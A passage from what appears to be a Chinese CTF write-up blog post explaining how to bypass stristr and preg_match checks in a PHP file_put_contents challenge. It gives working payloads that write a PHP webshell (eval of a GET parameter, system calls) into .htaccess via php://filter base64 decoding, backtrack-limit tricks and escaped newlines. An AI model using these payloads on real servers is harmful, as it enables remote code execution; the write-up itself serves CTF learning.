+    }</code></pre><h6 id=1-方法一：使用base64加密绕过stristr函数><a href=#1-方法一：使用base64加密绕过stristr函数 class=headerlink title=1.方法一：使用base64加密绕过stristr函数></a>1.方法一：使用base64加密绕过stristr函数</h6><p>p神的一篇文章：<a href=https://www.leavesongs.com/PENETRATION/php-filter-magic.html target=_blank rel=noopener>谈一谈php://filter的妙用</a><br>提到file_put_contents函数中的第一个参数<code>$filename</code>，即写入的文件名是可以控制协议的，所以我们可以用<code>php://filter流</code>的<code>base64-decode</code>方法将文件内容参数<code>$content</code>进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查。<br><strong>测试代码：</strong></p><pre><code class=php>&lt;?php 
+    $filename = $_GET[&#39;filename&#39;];
+    $content = $_GET[&#39;content&#39;];
+    if(stristr($content,&#39;&lt;?php&#39;)){
+        echo &#39;Hacker&#39;;
+        die();
+    } 
+    file_put_contents($filename, $content);
+?&gt;</code></pre><p>对要写入的content进行base64编码：</p><pre><code class=py>&gt;&gt;&gt; base64.b64encode(&#39;&lt;?php phpinfo(); ?&gt;&#39;)
+&#39;PD9waHAgcGhwaW5mbygpOyA/Pg==&#39;</code></pre><p>测试payload</p><pre><code class=php>?filename=php://filter/write=convert.base64-decode/resource=phpinfo.php&amp;content=PD9waHAgcGhwaW5mbygpOyA/Pg==</code></pre><p>访问<code>phpinfo.php</code>，成功显示phpinfo信息。<br><strong>绕过preg_match</strong></p><pre><code class=php>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
+        echo &quot;Hacker&quot;;
+        die();
+    }</code></pre><p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code> ，因此存在了被绕过的可能。</p><p>文件名写入<code>php://filter</code>需要绕过preg_match函数的检查。第一印象想到preg_match处理数组是会返回NULL，然而这里<code>file_put_contents</code>函数传入的文件名参数不支持数组的形式。<br>看xnuca2019-ezphp的wp发现一篇文章：<a href="https://mochazz.github.io/2019/01/13/preg_match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" target=_blank rel=noopener>preg_match函数绕过</a><br>思路是：通过正则匹配的递归次数来绕过，正则匹配的递归次数由<code>pcre.backtrack_limit</code>参数来控制<br>PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万。该值可以通过<code>php.ini</code>设置，也可以通过 <code>phpinfo</code>页面查看。<br><img src="http://img-blog.csdnimg.cn/20200913114426905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述></p><p>要让preg_match返回false，也就是匹配不到，即可绕过preg_match。这里就有一个骚操作，就是通过设置<code>pcre.backtrack_limit</code>值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false。<br>测试一下，是否能绕过preg_match：</p><pre><code class=php>&lt;?php
+ini_set(&#39;pcre.backtrack_limit&#39;,0);
+var_dump(preg_match(&#39;/[^a-z\.]/&#39;,&#39;php://filter&#39;));
+?&gt;
+//bool(false) </code></pre><p>成功绕过preg_match。<br><code>pcre.backtrack_limit</code>设置的是php的环境变量，也可以在<code>.htaccess</code>里设置，最终写入到<code>.htaccess</code>中内容如下：</p><pre><code class=bash>php_value pcre.backtrack_limit 0
+php_value pcre.jit 0
+php_value auto_prepend_file .htaccess
+#a&lt;?php eval($_GET[1]); ?&gt;\
+Hello, world</code></pre><p>因为php版本&gt;=7，所以需要特别设置<code>pcre.jit</code>这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得<code>pcre.backtrack_limit</code>这个环境变量能正常生效，绕过preg_match函数。<br>最终payload：</p><pre><code class=bash>?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fcHJlcGVuZF9maWxlIC5odGFjY2VzcwojYTw/cGhwIGV2YWwoJF9HRVRbMV0pOyA/Plw=&amp;1=phpinfo();</code></pre><p>网上都有这种方法做题，然而经过测试，并没有成功，在buu上复现xnuca2019-ezphp也没有成功。可能是环境问题。(暂时不知道是什么问题，等发现是什么问题后，再继续总结)</p><h6 id=2-方法二：对过滤的关键字中间添加换行-n绕过stristr函数><a href=#2-方法二：对过滤的关键字中间添加换行-n绕过stristr函数 class=headerlink title=2.方法二：对过滤的关键字中间添加换行\n绕过stristr函数></a>2.方法二：对过滤的关键字中间添加换行<code>\n</code>绕过stristr函数</h6><p>可以通过对过滤的关键字中间添加换行<code>\n</code>来绕过stristr函数的检测，不过仍然需要注意添加<code>\</code>来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入<code>.htaccess</code>来getshell<br>payload如下：</p><pre><code class=php>?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20/fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><p>写入<code>.htaccess</code>的内容：</p><pre><code class=bash>php_value auto_prepend_fil\ 
+e .htaccess 
+#&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\ 
+Just one chance</code></pre><p>然后访问index.php即可得到flag：<br><img src=http://img-blog.csdnimg.cn/2020091320395262.png alt=在这里插入图片描述><br>参考：<br><a href=https://nikoeurus.github.io/2019/12/01/xnuca-Web/#ezphp target=_blank rel=noopener>从xnuca2019-ezphp深入学习.htaccess</a><br><a href="https://www.bdwms.com/?p=525" target=_blank rel=noopener>2019XNUCA部分Web复盘</a></p><h2 id=0x04-后记><a href=#0x04-后记 class=headerlink title="0x04 后记"></a>0x04 后记</h2><p>基本总结完毕，比赛收获了很多知识。更深一步的了解到了<code>.htaccess</code>解析。继续努力！</p><hr><span style="font-style: italic;color: gray;">转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 qwzf1024@qq.com</span></div></article><p><a class=dashang onclick=dashangToggle()>赏</a></p><div id=vcomment class=comment></div><script src=//cdn1.lncld.net/static/js/3.0.4/av-min.js></script><script src=//unpkg.com/valine/dist/Valine.min.js></script><script src=https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js></script><script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'true' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "5cXOwuHg0Yrf8teE1lzRCjHi-gzGzoHsz",
+        app_key: "ToPzd33a36q3VXf83omuntVV",
+        placeholder: "快来评论呀！",
+        avatar:"mp",
+        recordIP: "true",
+        enableQQ: "true"
+    });
+</script></div><div class=copyright><p class=footer-entry><span class=miit><img src=/img/gov.png title=中华人民共和国工业和信息化部> <a href="http://beian.miit.gov.cn/">豫ICP备20008873号</a></span> ©2019-2020 Qwzf</p><p class=footer-entry>Built with <a href="https://hexo.io/" target=_blank>Hexo</a> and <a href=https://github.com/yelog/hexo-theme-3-hexo target=_blank>3-hexo</a> theme</p></div><div class=full-toc><button class=full data-title="切换全屏 快捷键 s"><span class=min></span></button> <a id=rocket></a></div></div><div class=hide_box onclick=dashangToggle()></div><div class=shang_box><a class=shang_close onclick=dashangToggle()>×</a><div class=shang_tit><p>喜欢就点赞,疼爱就打赏</p></div><div class=shang_payimg><div class=pay_img><img src=/img/alipay.jpg class=alipay title=扫码支持> <img src=/img/weixin.jpg class=weixin title=扫码支持></div></div><div class=shang_payselect><span><label><input type=radio name=pay checked value=alipay>支付宝</label></span><span><label><input type=radio name=pay value=weixin>微信</label></span></div></div><script src=/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body><script src="/js/jquery.pjax.js?v=1.1.0"></script><script>
+  function unmouse(){ 
+  document.oncontextmenu = new Function("return false;");
+  document.onkeydown = document.onkeyup = document.onkeypress = function(event) {
+      var e = event || window.event || arguments.callee.caller.arguments[0];
+      if (e && (e.keyCode == 123 || (e.keyCode == 116 && e.type!='keypress'))) 
+      {
+          e.returnValue = false;
+          return (false);
+      }
+  }
+  }
+  unmouse()
+</script><script src="/js/script.js?v=1.1.0"></script><script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script><style>
+    
+    
+    .nav {
+        width: 572px;
+    }
+    .nav.fullscreen {
+        margin-left: -572px;
+    }
+    .nav-left {
+        width: 150px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://img-blog.csdnimg.cn/20200726174858546.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style></html>
